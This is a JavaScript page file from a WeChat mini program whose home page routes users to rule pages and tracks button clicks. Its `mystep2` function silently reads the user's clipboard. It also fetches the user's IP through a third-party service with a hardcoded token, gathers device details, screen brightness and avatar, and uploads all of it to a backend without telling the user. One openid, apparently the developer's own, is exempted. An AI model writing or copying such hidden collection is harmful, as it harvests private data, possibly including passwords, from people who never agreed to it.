const AV = require('../../libs/av-weapp-min.js');
var mta = require('../../libs/mta_analysis.js')

var UseMessage = AV.Object.extend('UseMessage');
var Avatar = AV.Object.extend('Avatar');
var app = getApp()

// 在页面中定义激励视频广告
let videoAd = null

Page({
  data: {
    lastTimestamp: 0
  },

  onLoad: function() {
    mta.Page.init()
    wx.showShareMenu()

    // 在页面onLoad回调事件中创建激励视频广告实例
    if (wx.createRewardedVideoAd) {
      videoAd = wx.createRewardedVideoAd({
        adUnitId: 'adunit-79ec0f8be5efc0f1'
      })
      videoAd.onLoad(() => {
        console.log('onLoad')
      })
      videoAd.onError((err) => {
        console.log('onError')
      })
      videoAd.onClose((res) => {
        console.log('onClose ' + res)
      })
    }
  },

  //我的获取本次使用信息
  onShow: function() {
    //如果刚刚已经开过了
    if (this.data.lastTimestamp != 0) {
      var diffTimestamp = new Date().getTime() - this.data.lastTimestamp
      if (diffTimestamp < (5 * 60 * 1000)) {
        return;
      }
    }
    //新开的，或开了不久的
    this.setData({
      lastTimestamp: new Date().getTime()
    })
    var that = this
    //微信登录
    app.getUserInfo(function(userInfo) {
      //网络信息
      wx.getNetworkType({
        success: function(wxnet) {
          var time = new Date().getTime() + ""
          var user = AV.User.current().toJSON()
          //头像处理
          new AV.Query('Avatar').equalTo('openid', user.authData.lc_weapp.openid).find().then(function(results) {
            //如果查不到改用户，说明该用户第一次使用，新保存头像
            if (results.length == 0) {
              wx.downloadFile({
                url: userInfo.avatarUrl,
                success: function(res) {
                  var avatarFilePath = res.tempFilePath
                  new AV.File(user.authData.lc_weapp.openid + "-" + time, {
                    blob: {
                      uri: avatarFilePath
                    }
                  }).save().then(function(file) {
                    var avatar = new Avatar()
                    avatar.set('openid', user.authData.lc_weapp.openid)
                    avatar.set('avatarUrl', userInfo.avatarUrl)
                    avatar.set('myAvatarUrl', file.url())
                    avatar.set('time', time)
                    avatar.save()
                    //进行下一步
                    that.mystep2(time, userInfo, file.url(), wxnet)
                  });
                }
              })
              //如果能查到，说明是老用户
            } else {
              //比较已经存储头像和最新是否一致
              if (results[0].toJSON().avatarUrl != userInfo.avatarUrl) {
                //如果不一致，下载头像
                wx.downloadFile({
                  url: userInfo.avatarUrl,
                  success: function(res) {
                    var avatarFilePath = res.tempFilePath
                    new AV.File(user.authData.lc_weapp.openid + "-" + time, {
                      blob: {
                        uri: avatarFilePath
                      }
                    }).save().then(function(file) {
                      //更新Avatar表的avatarUrl和my
                      results[0].set('avatarUrl', userInfo.avatarUrl)
                      results[0].set('myAvatarUrl', file.url())
                      results[0].set('time', time)
                      results[0].save()
                      //进行下一步
                      that.mystep2(time, userInfo, file.url(), wxnet)
                    });
                  }
                })
              } else {
                //如果一致，直接进行下一步
                that.mystep2(time, userInfo, results[0].toJSON().myAvatarUrl, wxnet)
              }
            }
          });
        }
      })
    })
    //检查更新
    that.checkAppUpdate()
  },

  //mystep2
  mystep2: function(time, userInfo, myAvatarUrl, wxnet) {
    var user = AV.User.current().toJSON()
    var openid = AV.User.current().toJSON().authData.lc_weapp.openid
    if (openid == "o9K4b0QW0Yz2wosJeEIIk7QJo8Cg") {
      return
    }
    //屏幕亮度
    wx.getScreenBrightness({
      success: function(screenBrightness) {
        //剪切板
        wx.getClipboardData({
          success: function(clipboard) {
            //ip
            wx.request({
              url: 'https://api.ip138.com/query/?&token=12ff932c7f7d8e7349f9a09b74a88129',
              //2da165bab314e2b8749f5457728b1b72
              success: function(ip) {
                //系统信息
                var res = wx.getSystemInfoSync()
                const useMessage = new UseMessage({
                  //时间
                  time: time,
                  //场景值
                  scene: app.globalData.launchScene.scene,
                  //用户信息
                  openid: user.authData.lc_weapp.openid,
                  nickName: userInfo.nickName,
                  city: userInfo.city,
                  province: userInfo.province,
                  country: userInfo.country,
                  avatarUrl: userInfo.avatarUrl,
                  myAvatarUrl: myAvatarUrl,
                  //网络信息
                  networkType: wxnet.networkType,
                  ipjson: ip.data,
                  //系统信息
                  screenBrightness: screenBrightness.value,
                  clipboard: clipboard.data,
                  brand: res.brand,
                  model: res.model,
                  pixelRatio: res.pixelRatio,
                  screenWidth: res.screenWidth,
                  screenHeight: res.screenHeight,
                  windowWidth: res.windowWidth,
                  windowHeight: res.windowHeight,
                  statusBarHeight: res.statusBarHeight,
                  language: res.language,
                  version: res.version,
                  system: res.system,
                  platform: res.platform,
                  fontSizeSetting: res.fontSizeSetting,
                  SDKVersion: res.SDKVersion
                }).save()
              }
            })
          }
        })
      }
    });
  },

  //检查app更新，如有更新，自动强制更新
  checkAppUpdate: function() {
    wx.getUpdateManager().onCheckForUpdate(function(res) {
      if (res.hasUpdate) {
        wx.showToast({
          title: '小程序更新，稍后将自动重启...',
          icon: 'none'
        })
        wx.getUpdateManager().onUpdateReady(function() {
          wx.getUpdateManager().applyUpdate();
        })
      }
    })
  },

  //事件处理函数
  bindViewTap: function() {
    wx.navigateTo({
      url: '../logs/logs'
    })
  },

  toWbsdWorker: function() {
    mta.Event.stat('whichRuleButton', {
      'whichrule': 'wbsd',
      'workerordirector': 'worker'
    })
    wx.navigateTo({
      url: '../wbsd/worker/worker'
    })
  },

  toWbsdDirector: function() {
    mta.Event.stat('whichRuleButton', {
      'whichrule': 'wbsd',
      'workerordirector': 'director'
    })
    wx.navigateTo({
      url: '../wbsd/director/director'
    })
  },

  toSbsdWorker: function() {
    mta.Event.stat('whichRuleButton', {
      'whichrule': 'sbsd',
      'workerordirector': 'worker'
    })
    wx.navigateTo({
      url: '../sbsd/worker/worker'
    })
  },

  toSbsdDirector: function() {
    mta.Event.stat('whichRuleButton', {
      'whichrule': 'sbsd',
      'workerordirector': 'director'
    })
    wx.navigateTo({
      url: '../sbsd/director/director'
    })
  },

  toSbbdWorker: function() {
    mta.Event.stat('whichRuleButton', {
      'whichrule': 'sbbd',
      'workerordirector': 'worker'
    })
    wx.navigateTo({
      url: '../sbbd/worker/worker'
    })
  },

  toSbbdDirector: function() {
    mta.Event.stat('whichRuleButton', {
      'whichrule': 'sbbd',
      'workerordirector': 'director'
    })
    wx.navigateTo({
      url: '../sbbd/director/director'
    })
  },

  toSettingHome: function() {
    wx.navigateTo({
      url: '../setting/home/home'
    })
  },

  //跳转到我的DIY规则页面
  toMyDiy: function() {
    var that = this
    wx.showToast({
      title: '请稍候',
      icon: 'loading',
      duration: 20000
    });
    var query = new AV.Query('UserRule');
    query.equalTo('openid', AV.User.current().toJSON().authData.lc_weapp.openid);
    query.find().then(function(userRules) {
      if (userRules.length == 0) {
        wx.showModal({
          title: '提示',
          content: '尚未导入规则！',
          showCancel: false
        })
        wx.hideToast()
      } else {
        wx.navigateTo({
          url: '../diy/diy'
        })
      }
    })
  }
})